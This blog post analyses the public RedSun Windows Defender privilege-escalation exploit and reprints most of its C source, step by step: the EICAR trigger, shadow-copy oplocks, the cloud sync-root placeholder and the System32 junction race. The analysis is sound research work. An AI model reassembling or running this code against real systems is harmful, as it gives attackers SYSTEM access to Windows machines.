@@ -1,0 +1,663 @@
+---
+layout: post_layout
+title:  "RedSun Code Analysis"
+date:   2026-04-29 19:32:53 -0400
+tags: exploit windows
+description: "Breaking down the code of the recently released RedSun exploit."
+---
+
+RedSun is a recently released Windows Defender exploit that provides local privilege escalation. [Initially released by a researcher peeved with Microsoft's Security Response Center](https://github.com/Nightmare-Eclipse/RedSun), it has since been seen [exploited in the wild](https://www.huntress.com/blog/nightmare-eclipse-intrusion). While there are plenty of explanations on how it works, I haven't seen any actual code breakdowns, and this seems like a good learning opportunity. As a reminder, the core of the exploit is that Defender trusts whatever file path is used during a rollback, not checking if a junction is in place.
+
+One more note - there are no new revelations in this blog post; I am just breaking down the content of the exploit that has been available for a couple weeks now. I might follow up with a deeper dive into the relevant mechanics of Defender, but that depends on if I have time and if I find something else more interesting. Also, if you see any mistakes here, please reach out! I'm always looking to improve on my understanding and I'd be very appreciative.
+
+## Exploit Process
+- The exploit creates a named pipe (`\\??\pipe\REDSUN`) that will be used towards the end to relay the user's session ID to the elevated process
+- A staging directory is created at `C:\Users\<username>\AppData\Local\temp\RS-<guid>\`
+- A background thread (`ShadowCopyFinderThread`) is launched, which snapshots all existing `\Device\HarddiskVolumeShadowCopy*` entries as a baseline and starts polling for new ones
+- The EICAR test string is written to `C:\Users\<username>\AppData\Local\temp\RS-<guid>\TieringEngineService.exe`
+- That file is opened with `FILE_EXECUTE`, which triggers a scan by Windows Defender; the EICAR string is detected and Defender begins remediation
+- The first step of Defender's remediation process is to create a volume shadow copy of the full volume that contains the malicious file
+- The background thread (`ShadowCopyFinderThread`) detects the new VSS entry
+- It then opens the version of `TieringEngineService.exe` that is stored within the shadow copy and places a batch OPLOCK on it. Note that the OPLOCK is preemptive and will be used to notify when Defender accesses the file
+- Finally, the background thread signals that the shadow copy was created, found, and an OPLOCK has been placed on it
+- The main function receives the signal and deletes the EICAR file
+- `DoCloudStuff()` is called, which registers the staging directory as a cloud files sync root and creates a cloud placeholder called `TieringEngineService.exe`, making Defender think the file belongs to a cloud sync provider
+- Because the file has a cloud files attribute, Defender enters the rollback code path instead of a simple delete, trying to restore the file to its pre-infection state using the VSS snapshot, similar to rolling back a document on Google Docs.
+- Main signals the background thread that pre-work (file deletion and cloud setup) is complete, then waits for the thread to finish
+- The background thread's shadow copy OPLOCK eventually breaks (Defender accesses the shadow copy), the thread sees main's signal, releases its shadow copy handle, and wakes main
+- Main sets aside the staging directory (appends `.TMP`) and creates a new version with a new `TieringEngineService.exe` set to read-only
+- A second OPLOCK is created on the new file, followed by a file mapping with a section object, which prevents Defender from deleting or overwriting the file directly
+- Main waits until this second OPLOCK breaks, indicating Defender's remediation opened the new file
+- Main releases the file mapping and removes the file from the directory
+- A directory junction is created in the now-empty staging directory, pointing to `C:\Windows\System32`
+- Defender writes the restored file to the original detection path, which now resolves through the junction to `C:\Windows\System32\TieringEngineService.exe`
+- Main runs a loop attempting to supersede the file; when it succeeds, the attacker becomes the file's creator
+- Main closes the handle, then writes a copy of the exploit binary to `C:\Windows\System32\TieringEngineService.exe`
+- Main calls `LaunchTierManagementEng`, which instantiates the Storage Tiers Management Engine COM object, which runs `TieringEngineService.exe` as SYSTEM
+- The now-running exploit detects that it is running as SYSTEM and uses the named pipe to create a SYSTEM shell for the user
+
+## Main()
+The `main()` function seems a logical starting point because it is, obviously, the main logic in the exploit. All other functions stem off of it; I will refer to referenced functions later if I think they're relevant.
+
+```c
+    HANDLE hpipe = CreateNamedPipe(L"\\??\\pipe\\REDSUN", PIPE_ACCESS_DUPLEX | FILE_FLAG_FIRST_PIPE_INSTANCE, NULL, 1, NULL, NULL, NULL,NULL);
+    if (hpipe == INVALID_HANDLE_VALUE)
+        return 1;
+```
+The first portion of the exploit creates a named pipe called REDSUN. This will be used at the end for post-exploitation IPC when running as SYSTEM.
+
+```c
+    wchar_t workdir[MAX_PATH] = { 0 };
+    ExpandEnvironmentStrings(L"%TEMP%\\RS-", workdir, MAX_PATH);
+    
+	GUID uid = { 0 };
+    wchar_t wuid[100] = { 0 };
+    CoCreateGuid(&uid);
+    StringFromGUID2(uid, wuid, 100);
+    wcscat(workdir, wuid);
+    wchar_t filename[] = L"TieringEngineService.exe";
+    wchar_t foo[MAX_PATH];
+    wsprintf(foo, L"%ws\\%ws", workdir, filename);
+```
+Two notable variables are initialized here:
+- `workdir` stores the directory that the exploit will be working out of, created based on the user's temp directory (`C:\Users\<username>\AppData\Local\temp\`)
+- `foo` stores the full file path for the executable that will be used (`C:\Users\<username>\AppData\Local\temp\RS-<guid>\TieringEngineService.exe`)
+
+```c
+    DWORD tid = 0;
+    HANDLE hthread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)ShadowCopyFinderThread, foo, NULL, &tid);
+```
+Simply create a thread running the function `ShadowCopyFinderThread`, which I will document below this function.
+
+```c
+    if (!CreateDirectory(workdir, NULL))
+    {
+        printf("Failed to create workdir");
+        return 1;
+    }
+    
+    HANDLE hfile = CreateFile(foo, GENERIC_READ | GENERIC_WRITE | DELETE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    if (hfile == INVALID_HANDLE_VALUE)
+    {
+        printf("Failed create spoof work file.\n");
+        return 1;
+    }
+```
+This creates the actual directory stored in `workdir`, the temp directory, if it doesn't already exist. From there, it creates the file `foo`, also saving a handle to it in `hfile`. No data is actually stored in the file at this point.
+
+```c
+    char eicar[] = "*H+H$!ELIF-TSET-SURIVITNA-DRADNATS-RACIE$}7)CC7)^P(45XZP\\4[PA@%P!O5X";
+    rev(eicar);
+    DWORD nwf = 0;
+    WriteFile(hfile, eicar, sizeof(eicar) - 1, &nwf, NULL);
+    
+    CreateFile(foo, GENERIC_READ | FILE_EXECUTE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+```
+The EICAR string is reversed and stored in the newly created `foo` file using the handle. Immediately afterward, the file is opened for reading with `CreateFile`, which is intended to trigger an antivirus scan with Windows Defender.
+
+```c
+    if (WaitForSingleObject(gevent, 120000) != WAIT_OBJECT_0)
+    {
+        printf("PoC timed out, is real time protection enabled ?");
+        return 1;
+    }
+```
+Now there is a bit of a wait until the previously called `ShadowCopyFinderThread()` updates `gevent` to be in a signaled state, which occurs right after it detects the new VSS entry and the OPLOCK is placed on it.
+
+```c
+    IO_STATUS_BLOCK iostat = { 0 };
+    FILE_DISPOSITION_INFORMATION_EX fdiex = { 0x00000001 | 0x00000002 };
+    _NtSetInformationFile(hfile, &iostat, &fdiex, sizeof(fdiex), (FILE_INFORMATION_CLASS)64);
+    CloseHandle(hfile);
+```
+Before Windows Defender can delete the file, it is deleted aggressively with POSIX semantics. The main purpose of the aggressive deletion is to remove the link (basically the filename) from the directory immediately instead of waiting for all handles to close, as is the normal method. Notably, this deletion is completed before Defender can do so.
+
+```c
+    DoCloudStuff(workdir, filename, sizeof(eicar) - 1);
+```
+Calls `DoCloudStuff()`, which I will dig into below.
+
+```c
+    OVERLAPPED ovd = { 0 };
+    ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
+    
+    SetEvent(gevent);
+    
+    WaitOnAddress(&gevent, &gevent, sizeof(HANDLE), INFINITE);
+```
+A few small but important things - first, a zero-initialized `OVERLAPPED` structure is created, followed by `gevent` being set to the signaled state. Finally, it waits until the `ShadowCopyFinderThread()` function calls `WakeByAddressAll()`.
+
+```c
+    NTSTATUS stat;
+    wchar_t ntfoo[MAX_PATH] = { L"\\??\\" };
+    wcscat(ntfoo, foo);
+    UNICODE_STRING _foo = { 0 };
+    RtlInitUnicodeString(&_foo, ntfoo);
+    OBJECT_ATTRIBUTES _objattr = { 0 };
+    InitializeObjectAttributes(&_objattr, &_foo, OBJ_CASE_INSENSITIVE, NULL, NULL);
+```
+This simply creates a new `OBJECT_ATTRIBUTES` struct where the only piece of initialized data is the path, set to `\??\C:\Users\<username>\AppData\Local\temp\RS-<guid>\TieringEngineService.exe`.
+
+```c
+    wchar_t _tmp[MAX_PATH] = { 0 };
+    wsprintf(_tmp, L"\\??\\%s.TMP", workdir);
+    MoveFileEx(workdir,_tmp,MOVEFILE_REPLACE_EXISTING);
+    
+    if (!CreateDirectory(workdir, NULL))
+    {
+        printf("Failed to re-create directory.\n");
+        return 1;
+    }
+    
+    LARGE_INTEGER fsz = { 0 };
+    fsz.QuadPart = 0x1000;
+    stat = NtCreateFile(&hfile, FILE_READ_DATA | DELETE | SYNCHRONIZE, &_objattr, &iostat, &fsz, FILE_ATTRIBUTE_READONLY, FILE_SHARE_READ, FILE_SUPERSEDE, NULL, NULL, NULL);
+    if (stat)
+    {
+        printf("Failed to re-open spoof work file, error : 0x%0.8X\n", stat);
+        return 1;
+    }
+```
+Moving some files around:
+- Renames the directory `\??\c:\Users\<username>\AppData\Local\temp\RS-<guid>` to `\??\c:\Users\<username>\AppData\Local\temp\RS-<guid>.TMP`
+- Creates a new directory `\??\c:\Users\<username>\AppData\Local\temp\RS-<guid>`
+- Re-creates the file `\??\c:\Users\<username>\AppData\Local\temp\RS-<guid>\TieringEngineService.exe` in the new directory
+
+```c
+    DeviceIoControl(hfile, FSCTL_REQUEST_BATCH_OPLOCK, NULL, NULL, NULL, NULL, NULL, &ovd);
+    if (GetLastError() != ERROR_IO_PENDING)
+    {
+        printf("Failed to request a batch oplock on the update file, error : %d", GetLastError());
+        return 1;
+    }
+```
+From there, a batch OPLOCK is set on the recently re-created `\??\c:\Users\<username>\AppData\Local\temp\RS-<guid>\TieringEngineService.exe` file. This is intended to be broken later when Windows Defender attempts to access the file during remediation, alerting to its actions.
+
+```c
+    HANDLE hmap = CreateFileMapping(hfile, NULL, PAGE_READONLY, NULL, NULL, NULL);
+    void* mappingaddr = MapViewOfFile(hmap, PAGE_READONLY, NULL, NULL, NULL);
+```
+This maps the file `\??\c:\Users\<username>\AppData\Local\temp\RS-<guid>\TieringEngineService.exe` into virtual address space; note that the size being set to `NULL` indicates the whole file is being mapped, not just a portion. An interesting side effect of mapping a file into memory is that a section object is created, backed by the file. When a section object exists on a file, it cannot be deleted, overwritten, or opened (in a way that would conflict with the mapping), even for SYSTEM processes like Windows Defender.
+
+```c
+    DWORD nbytes = 0;
+    GetOverlappedResult(hfile, &ovd, &nbytes, TRUE);
+    UnmapViewOfFile(mappingaddr);
+    CloseHandle(hmap);
+```
+`GetOverlappedResult()` waits until the previously set OPLOCK breaks, indicating that Windows Defender is accessing the file. At this point the section object is no longer needed, so the file is unmapped and the handle is closed.
+
+```c
+    {
+        wchar_t _tmp[MAX_PATH] = { 0 };
+        wsprintf(_tmp, L"\\??\\%s.TEMP2", workdir);
+        
+		PFILE_RENAME_INFORMATION pfri = (PFILE_RENAME_INFORMATION)malloc(sizeof(FILE_RENAME_INFORMATION) + (sizeof(wchar_t) * wcslen(_tmp)));
+        ZeroMemory(pfri, sizeof(FILE_RENAME_INFORMATION) + (sizeof(wchar_t) * wcslen(_tmp)));
+        pfri->ReplaceIfExists = TRUE;
+        pfri->FileNameLength = (sizeof(wchar_t) * wcslen(_tmp));
+        memmove(&pfri->FileName[0], _tmp, (sizeof(wchar_t) * wcslen(_tmp)));
+        stat = _NtSetInformationFile(hfile, &iostat, pfri, sizeof(FILE_RENAME_INFORMATION) + (sizeof(wchar_t) * wcslen(_tmp)), (FILE_INFORMATION_CLASS)10);
+        _NtSetInformationFile(hfile, &iostat, &fdiex, sizeof(fdiex), (FILE_INFORMATION_CLASS)64);
+    }
+```
+This confusingly renames the file `\??\c:\Users\<username>\AppData\Local\temp\RS-<guid>\TieringEngineService.exe` to `\??\c:\Users\<username>\AppData\Local\temp\RS-<guid>.TEMP2`. I had to read this a few times to make sure it was correct because, earlier in the code, a directory was copied and appended with `.TMP`; not sure why it tripped me up so much. Anyway, the last line (`_NtSetInformationFile()`) marks the renamed file for POSIX deletion, immediately unlinking it from the directory (but not fully deleting it until the handles are gone). Note that now the file is unlinked, still referenced, and still controlled via handle.
+
+```c
+    wchar_t _rp[MAX_PATH] = { L"\\??\\" };
+    wcscat(_rp, workdir);
+    UNICODE_STRING _usrp = { 0 };
+    RtlInitUnicodeString(&_usrp, _rp);
+    InitializeObjectAttributes(&_objattr, &_usrp, OBJ_CASE_INSENSITIVE, NULL, NULL);
+    HANDLE hrp = NULL;
+    stat = NtCreateFile(&hrp, FILE_WRITE_DATA | DELETE | SYNCHRONIZE, &_objattr, &iostat, NULL, NULL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_OPEN_IF, FILE_DIRECTORY_FILE | FILE_DELETE_ON_CLOSE, NULL, NULL);
+    if (stat)
+    {
+        printf("Failed to re-open work directory.\n");
+        return 1;
+    }
+```
+This portion opens the working directory with a handle that allows writing data to it, which will be used to write a reparse point. Note the attribute `FILE_DELETE_ON_CLOSE`, indicating that the directory will be deleted when the handle `hrp` is closed.
+
+```c
+    wchar_t rptarget[] = { L"\\??\\C:\\Windows\\System32" };
+    DWORD targetsz = wcslen(rptarget) * 2;
+    DWORD printnamesz = 1 * 2;
+    DWORD pathbuffersz = targetsz + printnamesz + 12;
+    DWORD totalsz = pathbuffersz + REPARSE_DATA_BUFFER_HEADER_LENGTH;
+    REPARSE_DATA_BUFFER* rdb = (REPARSE_DATA_BUFFER*)HeapAlloc(GetProcessHeap(), HEAP_GENERATE_EXCEPTIONS | HEAP_ZERO_MEMORY, totalsz);
+    rdb->ReparseTag = IO_REPARSE_TAG_MOUNT_POINT;
+    rdb->ReparseDataLength = static_cast<USHORT>(pathbuffersz);
+    rdb->Reserved = NULL;
+    rdb->MountPointReparseBuffer.SubstituteNameOffset = NULL;
+    rdb->MountPointReparseBuffer.SubstituteNameLength = static_cast<USHORT>(targetsz);
+    memcpy(rdb->MountPointReparseBuffer.PathBuffer, rptarget, targetsz + 2);
+    rdb->MountPointReparseBuffer.PrintNameOffset = static_cast<USHORT>(targetsz + 2);
+    rdb->MountPointReparseBuffer.PrintNameLength = static_cast<USHORT>(printnamesz);
+    memcpy(rdb->MountPointReparseBuffer.PathBuffer + targetsz / 2 + 1, rptarget, printnamesz);
+    DWORD ret = DeviceIoControl(hrp, FSCTL_SET_REPARSE_POINT, rdb, totalsz, NULL, NULL, NULL, NULL);
+    HeapFree(GetProcessHeap(), NULL, rdb);
+	
+    HANDLE hlk = NULL;
+```
+This big chunk of code creates a directory junction in the directory referenced by `hrp`; the junction points to the System32 directory. After the `DeviceIoControl()` function, anything done in the `workdir` location now resolves to that same relative location in `C:\Windows\System32\` due to the directory junction.
+
+```c
+    HANDLE htimer = CreateWaitableTimer(NULL, FALSE, NULL);
+    LARGE_INTEGER duetime = { 0 };
+    GetSystemTimeAsFileTime((LPFILETIME)&duetime);
+    ULARGE_INTEGER _duetime = { duetime.LowPart, duetime.HighPart };
+    _duetime.QuadPart += 0x2FAF080;
+    duetime.QuadPart = _duetime.QuadPart;
+    CloseHandle(hfile);
+```
+This creates a five second timer, but it never actually seems to be started, so I assume this is a minor oversight by the developer. The only meaningful code is the closing of the `hfile` handle.
+
+```c
+    for (int i = 0; i < 1000; i++)
+    {
+        wchar_t malpath[] = { L"\\??\\C:\\Windows\\System32\\TieringEngineService.exe" };
+        UNICODE_STRING _malpath = { 0 };
+        RtlInitUnicodeString(&_malpath, malpath);
+        OBJECT_ATTRIBUTES objattr2 = { 0 };
+        InitializeObjectAttributes(&objattr2, &_malpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
+        IO_STATUS_BLOCK iostat = { 0 };
+        stat = NtCreateFile(&hlk, GENERIC_WRITE, &objattr2, &iostat, NULL, NULL, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, FILE_SUPERSEDE, NULL, NULL, NULL);
+        if (!stat)
+            break;
+        Sleep(20);
+    }
+```
+Now it attempts to create the file `\??\C:\Windows\System32\TieringEngineService.exe`. Because it is essentially a race condition, the code tries to do this up to a thousand times, separated by 20ms after each failure and breaking on a success. Normally this process wouldn't succeed as the exploit is running as a non-privileged user, but it can succeed if the file's security descriptor allows it, which it does - it is inherited from Defender's SYSTEM-level context creation through the junction.
+
+```c
+    wchar_t mx[MAX_PATH] = { 0 };
+    GetModuleFileName(GetModuleHandle(NULL), mx, MAX_PATH);
+    wchar_t mx2[MAX_PATH] = { 0 };
+    ExpandEnvironmentStrings(L"%WINDIR%\\System32\\TieringEngineService.exe", mx2, MAX_PATH);
+    CopyFile(mx, mx2, FALSE);
+```
+This portion copies the exploit executable to the newly created `C:\Windows\System32\TieringEngineService.exe` file.
+
+```c
+    LaunchTierManagementEng();
+    Sleep(2000);
+    CloseHandle(hpipe);
+```
+The function `LaunchTierManagementEng()` simply launches the Storage Tiers Management Engine COM object which in turn runs the file `C:\Windows\System32\TieringEngineService.exe`, now overwritten with the exploit code. Note that this COM object was chosen specifically because it runs as SYSTEM whereas most COM objects run at the user level. When launched as SYSTEM, an earlier call to `IsRunningAsLocalSystem()` spawns a SYSTEM shell using the REDSUN named pipe created earlier.
+
+## ShadowCopyFinderThread()
+This function works in parallel with the main function primarily to track and manipulate shadow copies.
+
+```c
+    wchar_t devicepath[] = L"\\Device";
+    UNICODE_STRING udevpath = { 0 };
+    RtlInitUnicodeString(&udevpath, devicepath);
+    OBJECT_ATTRIBUTES objattr = { 0 };
+    InitializeObjectAttributes(&objattr, &udevpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
+    NTSTATUS stat = STATUS_SUCCESS;
+    HANDLE hobjdir = NULL;
+    stat = _NtOpenDirectoryObject(&hobjdir, 0x0001, &objattr);
+    if (stat)
+    {
+        printf("Failed to open object manager directory, error : 0x%0.8X", stat);
+        return 1;
+    }
+```
+The first portion of the `ShadowCopyFinderThread()` function attempts to open the object manager directory, located at `\Device\`.
+
+```c
+    bool criterr = false;
+    int vscnum = 0;
+    LLShadowVolumeNames* vsinitial = RetrieveCurrentVSSList(hobjdir, &criterr, &vscnum);
+    if (criterr)
+    {
+        printf("Unexpected error while listing current volume shadow copy volumes\n");
+        ExitProcess(1);
+    }
+```
+From there, all volume shadow copies that currently exist are enumerated using `RetrieveCurrentVSSList()`. I won't go into the details of that function; the important part is that it returns a linked list of all the found volume shadow copies. Note that a lot of the following code is virtually identical to the content of `RetrieveCurrentVSSList()`, just modified slightly for performance improvements that are available when it isn't necessary to get a full list of every volume shadow copy.
+
+```c
+    bool restartscan = false;
+    ULONG scanctx = 0;
+    ULONG reqsz = sizeof(OBJECT_DIRECTORY_INFORMATION) + (UNICODE_STRING_MAX_BYTES * 2);
+    ULONG retsz = 0;
+    OBJECT_DIRECTORY_INFORMATION* objdirinfo = (OBJECT_DIRECTORY_INFORMATION*)malloc(reqsz);
+    if (!objdirinfo)
+    {
+        printf("Failed to allocate required buffer to query object manager directory.\n");
+        ExitProcess(1);
+    }
+    ZeroMemory(objdirinfo, reqsz);
+    stat = STATUS_SUCCESS;
+    bool srchfound = false;
+```
+Simple preparation for scanning the `\Device\` directory manually, nothing too notable.
+
+```c
+scanagain:
+    do
+    {
+        scanctx = 0;
+        stat = _NtQueryDirectoryObject(hobjdir, objdirinfo, reqsz, FALSE, restartscan, &scanctx, &retsz);
+        if (stat == STATUS_SUCCESS)
+            break;
+        else if (stat != STATUS_MORE_ENTRIES)
+        {
+            printf("NtQueryDirectoryObject failed with 0x%0.8X\n", stat);
+            ExitProcess(1);
+        }
+		
+        free(objdirinfo);
+        reqsz += sizeof(OBJECT_DIRECTORY_INFORMATION) + 0x100;
+        objdirinfo = (OBJECT_DIRECTORY_INFORMATION*)malloc(reqsz);
+        if (!objdirinfo)
+        {
+            printf("Failed to allocate required buffer to query object manager directory.\n");
+            ExitProcess(1);
+        }
+        ZeroMemory(objdirinfo, reqsz);
+    } while (1);
+```
+This loop scans all entries from `\Device\` and stores them in a buffer. If the buffer isn't large enough to store all of the entries, the size is increased and the loop repeats.
+
+```c
+    void* emptybuff = malloc(sizeof(OBJECT_DIRECTORY_INFORMATION));
+    if (!emptybuff)
+    {
+        printf("Failed to allocate memory !!!");
+        ExitProcess(1);
+    }
+    ZeroMemory(emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION));
+    wchar_t newvsspath[MAX_PATH] = { 0 };
+    wcscpy(newvsspath, L"\\Device\\");
+```
+More preparation for later. This creates a sentinel `OBJECT_DIRECTORY_INFORMATION` struct that will be used to indicate the end of the next loop.
+
+```c
+    for (ULONG i = 0; i < ULONG_MAX; i++)
+    {
+        if (memcmp(&objdirinfo[i], emptybuff, sizeof(OBJECT_DIRECTORY_INFORMATION)) == 0)
+        {
+            free(emptybuff);
+            emptybuff = NULL;
+            break;
+        }
+		
+        // type check
+        if (_wcsicmp(L"Device", objdirinfo[i].TypeName.Buffer) == 0)
+        {
+            // length comparison
+            wchar_t cmpstr[] = { L"HarddiskVolumeShadowCopy" };
+            if (objdirinfo[i].Name.Length >= sizeof(cmpstr))
+            {
+	            // prefix match
+                if (memcmp(cmpstr, objdirinfo[i].Name.Buffer, sizeof(cmpstr) - sizeof(wchar_t)) == 0)
+                {
+                    LLShadowVolumeNames* current = vsinitial;
+                    bool found = false;
+                    while (current)
+                    {
+                        if (_wcsicmp(current->name, objdirinfo[i].Name.Buffer) == 0)
+                        {
+                            found = true;
+                            break;
+                        }
+                        current = current->next;
+                    }
+                    if (found)
+                        continue;
+                    else
+                    {
+                        srchfound = true;
+                        wcscat(newvsspath, objdirinfo[i].Name.Buffer);
+                        break;
+                    }
+                }
+            }
+        }
+    }
+```
+The outermost loop is intended to go through every entry in `objdirinfo`, which represents all entries within `\Device\`, finally breaking when it hits the sentinel `OBJECT_DIRECTORY_INFORMATION` struct that was created previously. Each entry is filtered based on the the type (requires `Device`), length (minimum length equal to `HarddiskVolumeShadowCopy`, used to save time by not comparing strings of anything shorter), and a prefix match (does it start with `HarddiskVolumeShadowCopy`?). This ensures that the remaining items are volume shadow copies. The innermost section walks the `vsinitial` linked list and checks for a volume shadow copy that doesn't already exist, indicating it was added since the last scan and is likely to have originated from Windows Defender.
+
+```c
+    if (!srchfound) {
+        restartscan = true;
+        goto scanagain;
+    }
+    if (objdirinfo)
+        free(objdirinfo);
+    NtClose(hobjdir);
+    
+	wchar_t malpath[MAX_PATH] = { 0 };
+    wcscpy(malpath, newvsspath);
+```
+If no new results were found, restart the scan; otherwise, do a bit of cleanup and preparation before continuing on.
+
+```c
+    wcscat(malpath, &foo[2]);
+    UNICODE_STRING _malpath = { 0 };
+    RtlInitUnicodeString(&_malpath, malpath);
+    OBJECT_ATTRIBUTES objattr2 = { 0 };
+    InitializeObjectAttributes(&objattr2, &_malpath, OBJ_CASE_INSENSITIVE, NULL, NULL);
+    IO_STATUS_BLOCK iostat = { 0 };
+    HANDLE hlk = NULL;
+```
+Remember that the `foo` variable (passed into the function) stores `C:\Users\<username>\AppData\Local\temp\RS-<guid>\TieringEngineService.exe`; the file referred to doesn't actually exist yet. This chunk of code creates an object attribute struct with a slightly modified version of that path - the first two characters are removed (`C:`) and the path to the new VSS copy is added to the beginning, producing something like `\Device\HarddiskVolumeShadowCopy4\Users\<username>\AppData\Local\Temp\RS-<guid>\TieringEngineService.exe`.
+
+```c
+retry:
+    stat = NtCreateFile(&hlk, DELETE | SYNCHRONIZE, &objattr2, &iostat, NULL, FILE_ATTRIBUTE_NORMAL, NULL, FILE_OPEN, NULL, NULL, NULL);
+    if (stat == STATUS_NO_SUCH_DEVICE)
+        goto retry;
+    if (stat)
+    {
+        printf("Failed to open file, error : 0x%0.8X\n", stat);
+        return 1;
+	
+    }
+    printf("The sun is shinning...\n");
+```
+This opens the file that was referred to by the path created in the last step, retrying if the shadow copy hasn't fully initialized yet.
+
+```c
+    OVERLAPPED ovd = { 0 };
+    ovd.hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);
+    DeviceIoControl(hlk, FSCTL_REQUEST_BATCH_OPLOCK, NULL, NULL, NULL, NULL, NULL, &ovd);
+    if (GetLastError() != ERROR_IO_PENDING)
+    {
+        printf("Failed to request a batch oplock on the update file, error : %d", GetLastError());
+        return 0;
+    }
+```
+Create an OPLOCK on `TieringEngineService.exe` (the one inside the shadow copy volume). This is intended to trip when Windows Defender tries to read from the shadow copy to restore the file.
+
+```c
+	DWORD nbytes = 0;
+    SetEvent(gevent);
+    ResetEvent(gevent);
+```
+Signal the main function that the shadow copy has been found and that the OPLOCK is in place
+
+```c
+    GetOverlappedResult(hlk, &ovd, &nbytes, TRUE);
+```
+Wait for Defender to touch the shadow copy, breaking the OPLOCK
+
+```c
+    WaitForSingleObject(gevent, INFINITE);
+```
+Wait for `gevent` to enter the signaled state again
+
+```c
+    CloseHandle(hlk);
+    
+	WakeByAddressAll(&gevent);
+    CloseHandle(gevent);
+    gevent = NULL;
+	
+    return ERROR_SUCCESS;
+```
+Release the handle on the shadow copy file, allowing Defender's operation to go on. Also wakes the main thread.
+
+## DoCloudStuff()
+```c
+    CF_SYNC_REGISTRATION cfreg = { 0 };
+    cfreg.StructSize = sizeof(CF_SYNC_REGISTRATION);
+    cfreg.ProviderName = L"SERIOUSLYMSFT";
+    cfreg.ProviderVersion = L"1.0";
+    CF_SYNC_POLICIES syncpolicy = { 0 };
+    syncpolicy.StructSize = sizeof(CF_SYNC_POLICIES);
+    syncpolicy.HardLink = CF_HARDLINK_POLICY_ALLOWED;
+    syncpolicy.Hydration.Primary = CF_HYDRATION_POLICY_PARTIAL;
+    syncpolicy.Hydration.Modifier = CF_HYDRATION_POLICY_MODIFIER_NONE;
+    syncpolicy.PlaceholderManagement = CF_PLACEHOLDER_MANAGEMENT_POLICY_DEFAULT;
+    syncpolicy.InSync = CF_INSYNC_POLICY_NONE;
+    HRESULT hs = CfRegisterSyncRoot(syncroot, &cfreg, &syncpolicy, CF_REGISTER_FLAG_DISABLE_ON_DEMAND_POPULATION_ON_ROOT);
+    if (hs)
+    {
+        printf("Failed to register syncroot, hr = 0x%0.8X\n", hs);
+        return;
+    }
+```
+`DoCloudStuff()` starts out with performing a sync root registration with a newly created sync provider. This basically means it is telling Windows (and by extension, Defender) to treat the directory as if it were a OneDrive or Dropbox folder but instead managed by the newly registered cloud sync provider. From here on out, any files created in the staging directory will have cloud file attributes, which will make Defender use its rollback method instead of a straightforward deletion. Some of the policies set here are worth knowing, but I don't have a good enough understanding to explain them at this point.
+
+```c
+    CF_CALLBACK_REGISTRATION callbackreg[1];
+    callbackreg[0] = { CF_CALLBACK_TYPE_NONE, NULL };
+    void* callbackctx = NULL; 
+    CF_CONNECTION_KEY cfkey = { 0 };
+    hs = CfConnectSyncRoot(syncroot, callbackreg, callbackctx, CF_CONNECT_FLAG_REQUIRE_PROCESS_INFO | CF_CONNECT_FLAG_REQUIRE_FULL_FILE_PATH, &cfkey);
+    if (hs)
+    {
+        printf("Failed to connect to syncroot, hr = 0x%0.8X\n", hs);
+        return;
+    }
+```
+The previous chunk of code created a persistent registration, which means it will continue on after reboot. This section creates an active connection, indicating that the process is actually the live sync provider and can handle callbacks made.
+
+```c
+    SYSTEMTIME systime = { 0 };
+    FILETIME filetime = { 0 };
+    GetSystemTime(&systime);
+    SystemTimeToFileTime(&systime, &filetime);
+	
+    FILE_BASIC_INFO filebasicinfo = { 0 };
+    filebasicinfo.FileAttributes = FILE_ATTRIBUTE_NORMAL;
+    CF_FS_METADATA fsmetadata = { filebasicinfo, {filesz} };
+    CF_PLACEHOLDER_CREATE_INFO placeholder[1] = { 0 };
+    placeholder[0].RelativeFileName = filename;
+    placeholder[0].FsMetadata = fsmetadata;
+```
+This is mostly just setup for the next step, nothing too notable (as far as I can tell).
+
+```c
+    GUID uid = { 0 };
+    wchar_t wuid[100] = {0};
+    CoCreateGuid(&uid);
+    StringFromGUID2(uid, wuid,100);
+    placeholder[0].FileIdentity = wuid;
+    placeholder[0].FileIdentityLength = lstrlenW(wuid) * sizeof(wchar_t);
+    placeholder[0].Flags = CF_PLACEHOLDER_CREATE_FLAG_SUPERSEDE | CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC;
+    DWORD processedentries = 0;
+    hs = CfCreatePlaceholders(syncroot, placeholder, 1, CF_CREATE_FLAG_STOP_ON_ERROR, &processedentries);
+    if (hs)
+    {
+        printf("Failed to create placeholder file, error : 0x%0.8X\n", hs);
+        return;
+    }
+    return;
+```
+The final part of this function creates the actual placeholder file. It starts by generating a GUID to identify the cloud placeholder, followed by setting two flags. `CF_PLACEHOLDER_CREATE_FLAG_SUPERSEDE` says that if a file already exists at a local path, replace it entirely; `CF_PLACEHOLDER_CREATE_FLAG_MARK_IN_SYNC` says that there is no need to reach out to the sync provider when the file is accessed, rather that it is already synced. Finally, the actual placeholder file is created, in this case in `workdir` (`C:\Users\<username>\AppData\Local\temp\RS-<guid>\TieringEngineService.exe`).
+
+
+## IsRunningAsLocalSystem()
+```c
+    HANDLE htoken = NULL;
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &htoken)) {
+        printf("OpenProcessToken failed, error : %d\n", GetLastError());
+        return false;
+    }
+```
+This function starts out by getting a handle to the process token of the current process with permission to query the token's information (`TOKEN_QUERY`).
+
+```c
+    TOKEN_USER* tokenuser = (TOKEN_USER*)malloc(MAX_SID_SIZE + sizeof(TOKEN_USER));
+    DWORD retsz = 0;
+    bool res = GetTokenInformation(htoken, TokenUser, tokenuser, MAX_SID_SIZE + sizeof(TOKEN_USER), &retsz);
+    CloseHandle(htoken);
+    if (!res)
+        return false;
+```
+From there, query the actual information for the token, specifically `TokenUser`. This field, within `TOKEN_INFORMATION_CLASS`, contains the struct `TOKEN_USER` that stores information about the actual user; results are stored in `tokenuser`.
+
+```c
